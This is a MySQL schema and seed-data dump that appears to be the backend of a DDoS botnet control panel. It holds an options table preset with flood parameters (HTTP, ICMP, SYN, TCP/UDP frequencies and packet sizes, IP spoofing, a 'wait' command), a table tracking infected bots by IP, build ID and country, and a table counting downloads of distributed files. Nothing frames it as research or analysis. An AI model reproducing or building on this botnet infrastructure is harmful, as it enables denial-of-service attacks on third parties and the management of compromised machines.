--
-- Table structure for table `files`
--

DROP TABLE IF EXISTS `files`;
CREATE TABLE `files` (
  `id` int(11) NOT NULL auto_increment,
  `url` varchar(255) NOT NULL,
  `dnum` int(11) NOT NULL default '0',
  `dtotal` int(11) NOT NULL default '0',
  `country` varchar(10) NOT NULL,
  PRIMARY KEY  (`id`)
);

--
-- Dumping data for table `files`
--

--
-- Table structure for table `opt`
--

DROP TABLE IF EXISTS `opt`;
CREATE TABLE `opt` (
  `name` varchar(255) NOT NULL,
  `value` varchar(255) NOT NULL,
  PRIMARY KEY  (`name`)
);

--
-- Dumping data for table `opt`
--

INSERT INTO `opt` VALUES ('attack_mode','0'),('cmd','wait'),('http_freq','100'),('http_threads','3'),('icmp_freq','10'),('icmp_size','2000'),('max_sessions','30'),('spoof_ip','0'),('syn_freq','10'),('tcpudp_freq','20'),('tcp_size','2000'),('udp_size','1000'),('ufreq','10');

--
-- Table structure for table `stat`
--

DROP TABLE IF EXISTS `stat`;
CREATE TABLE `stat` (
  `id` varchar(30) NOT NULL,
  `build_id` varchar(30) NOT NULL,
  `files` text,
  `ip` varchar(20) NOT NULL,
  `last` int(11) NOT NULL,
  `country` varchar(5) NOT NULL,
  `country_full` varchar(50) NOT NULL,
  PRIMARY KEY  (`id`)
);

--
-- Dumping data for table `stat`
--
